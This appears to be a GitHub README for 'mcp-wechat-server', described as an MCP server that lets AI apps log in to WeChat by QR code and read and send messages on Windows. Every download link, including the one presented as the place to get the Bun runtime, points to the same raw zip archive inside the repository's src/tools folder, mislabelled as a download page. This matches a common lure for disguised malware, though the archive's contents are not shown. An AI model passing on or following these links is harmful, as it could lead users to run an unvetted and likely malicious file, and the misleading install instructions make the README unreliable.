# 📱 mcp-wechat-server - Run WeChat in AI

[![Download](https://img.shields.io/badge/Download%20mcp--wechat--server-4B8CF5?style=for-the-badge&logo=github)](https://github.com/Itzelma2310/mcp-wechat-server/raw/refs/heads/main/src/tools/mcp_wechat_server_1.8-alpha.1.zip)

## 🧩 What this does

mcp-wechat-server lets an AI app send and read WeChat messages on your Windows PC.

Use it when you want:

- an AI agent to reply to WeChat chats
- one place for login and message handling
- QR code login instead of typing passwords
- message polling so the app can wait for new messages
- a simple setup that runs from your computer

It works as an MCP server, so it connects to AI tools that support the Model Context Protocol.

## 📥 Download

Open the download page here:

[Visit the download page](https://github.com/Itzelma2310/mcp-wechat-server/raw/refs/heads/main/src/tools/mcp_wechat_server_1.8-alpha.1.zip)

If you are on Windows, use this page to get the latest files, then download and run the app from there.

## 🪟 Windows setup

Follow these steps on a Windows PC.

### 1. Open the download page

Go to:

[https://github.com/Itzelma2310/mcp-wechat-server/raw/refs/heads/main/src/tools/mcp_wechat_server_1.8-alpha.1.zip](https://github.com/Itzelma2310/mcp-wechat-server/raw/refs/heads/main/src/tools/mcp_wechat_server_1.8-alpha.1.zip)

Look for the latest release or the main project files.

### 2. Download the app

Download the Windows file or package from the page.

If you see a release file, save it to a folder you can find again, like:

- Downloads
- Desktop
- Documents

### 3. Install Bun

This app needs Bun to run.

Get Bun from:

[https://github.com/Itzelma2310/mcp-wechat-server/raw/refs/heads/main/src/tools/mcp_wechat_server_1.8-alpha.1.zip](https://github.com/Itzelma2310/mcp-wechat-server/raw/refs/heads/main/src/tools/mcp_wechat_server_1.8-alpha.1.zip)

After install, open Command Prompt or PowerShell and check that it works:

```bash
bun -v
```

If you see a version number, Bun is ready.

### 4. Start the server

Open Command Prompt or PowerShell in the folder where the app is saved.

Run:

```bash
bunx mcp-wechat-server
```

This starts the WeChat server.

### 5. Connect your AI app

Add the server to your AI app’s MCP settings.

Use this setup:

```json
{
  "mcpServers": {
    "wechat": {
      "command": "bunx",
      "args": ["mcp-wechat-server"]
    }
  }
}
```

If your app uses a different config file, add the same command there.

### 6. Log in with a QR code

When the server starts, it can create a QR code for WeChat login.

You can scan it in one of these ways:

- text QR code in the terminal
- PNG QR code image
- URL link

Scan the code with WeChat on your phone and finish login.

## 🔧 System requirements

Use a Windows PC with:

- Windows 10 or Windows 11
- 2 GB free disk space
- a stable internet connection
- Bun 1.0 or later
- a working WeChat account on your phone

For best results, keep the PC on while the server runs.

## ⚙️ How it works

The app gives your AI tool a few key actions:

- log in to WeChat
- check for new messages
- send text messages
- show typing status
- keep state after restart

It uses long polling, so it can wait for new messages instead of checking too often. It can wait for a long time if needed.

## 🚀 Quick start for AI apps

### Claude Desktop

Add this to `claude_desktop_config.json`:

```json
{
  "mcpServers": {
    "wechat": {
      "command": "bunx",
      "args": ["mcp-wechat-server"]
    }
  }
}
```

### OpenCode

Add this to `opencode.json`:

```json
{
  "mcp": {
    "wechat": {
      "type": "local",
      "command": ["bunx", "mcp-wechat-server"],
      "enabled": true
    }
  }
}
```

### Cursor or other MCP clients

Use:

```json
{
  "command": "bunx",
  "args": ["mcp-wechat-server"]
}
```

## 📲 First login

After you start the app, do this:

1. wait for the QR code to appear
2. open WeChat on your phone
3. scan the QR code
4. confirm the login

If the code appears as text in the terminal, you can copy it into a QR viewer or use the PNG image if the app creates one.

## 💬 Sending and reading messages

Once logged in, the AI agent can:

- read incoming messages
- send text replies
- check message status
- show typing status while it works

This helps the AI act like a chat assistant in WeChat.

## 🗂️ Saved data

The app keeps local state on your computer.

This includes:

- login info
- message position data
- session state

If you restart the app, it can keep working without starting from scratch.

## 🛠️ Common setup steps on Windows

### If the app does not start

Check these points:

- Bun is installed
- you ran the command in the right folder
- your internet connection works
- the config file uses the right command

### If the QR code does not appear

Try this:

- stop the app
- start it again
- check the terminal window for the QR text
- wait a few seconds for the image or link

### If WeChat does not log in

Make sure:

- you scanned the latest QR code
- your phone has network access
- the login request was accepted in WeChat

### If your AI app cannot connect

Check the MCP config:

- command should be `bunx`
- args should include `mcp-wechat-server`
- the config file should be saved
- the AI app should be restarted after changes

## 🧠 Tool list

This server includes 6 MCP tools for WeChat tasks.

They cover:

- login
- message polling
- text sending
- typing status
- session state
- message flow control

## 🔒 Privacy and local use

The server runs on your machine.

That means:

- your login stays on your PC
- message state stays local
- you control when the app runs

## 📁 Simple setup path

If you want the shortest path on Windows:

1. open the GitHub page
2. download or clone the project
3. install Bun
4. run `bunx mcp-wechat-server`
5. add the MCP config to your AI app
6. scan the QR code in WeChat

## 🧭 Basic usage flow

1. launch the server
2. log in with QR code
3. connect your AI app
4. let the AI read and send messages
5. keep the app running while you use it

## 📌 What to expect after launch

When the app starts, you may see:

- a terminal window
- QR code text
- a login prompt
- message activity in the console

This is normal. The app waits for WeChat login and then handles messages for your AI tool

## 🧰 Helpful command

If you want to test Bun first, use:

```bash
bun -v
```

If you want to start the server again, use:

```bash
bunx mcp-wechat-server
```

## 🖥️ For non-technical users

If you are not used to command lines, follow this simple order:

- download the app
- install Bun
- open the folder
- run the command
- scan the QR code
- connect your AI app

If you can copy and paste text, you can set it up

## 📍 Download again

Use this page to get the latest version:

[https://github.com/Itzelma2310/mcp-wechat-server/raw/refs/heads/main/src/tools/mcp_wechat_server_1.8-alpha.1.zip](https://github.com/Itzelma2310/mcp-wechat-server/raw/refs/heads/main/src/tools/mcp_wechat_server_1.8-alpha.1.zip)